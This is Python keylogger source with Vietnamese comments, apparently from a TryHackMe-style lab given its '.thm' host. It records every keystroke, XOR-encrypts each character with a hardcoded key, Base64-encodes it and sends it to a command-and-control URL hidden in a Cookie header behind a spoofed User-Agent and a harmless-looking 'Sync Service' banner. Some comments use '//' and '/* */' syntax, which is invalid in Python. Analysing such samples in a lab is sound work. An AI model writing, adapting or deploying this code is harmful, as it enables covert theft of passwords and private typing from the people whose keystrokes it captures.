/*
Đoạn mã này là một keylogger đơn giản viết bằng Python. Chức năng của nó là:

Theo dõi các phím người dùng nhấn.
Mã hóa từng ký tự bằng phép XOR.
Mã hóa Base64 kết quả.
Gửi dữ liệu tới một máy chủ HTTP thông qua trường Cookie trong request.
*/

import requests
import base64
from pynput import keyboard

//URl máy chủ nhận dữ liệu
C2_URL = "http://byte-lotus-hotel.thm:8080/"

//lấy key
def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

#mã hóa xor sử dụng các kí tự trong key (lặp lại khóa nếu dữ liệu dài hơn) #mã hóa từng ký tự trong data
def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character): 
    raw_bytes = character.encode('utf-8')# chuyển thành mã ascii 
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))# mã hóa
    
    #encoding base64 dữ liệu đã encrypted
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    #tạo header với dữ liệu đã encoding vào trường Cookie
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    #Gửi request    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

#hàm bắt khi bấm phím
def on_press(key):
    try:
    # gửi dữ liệu lên server
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

#nơi chương trình bắt đầu chạy
print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
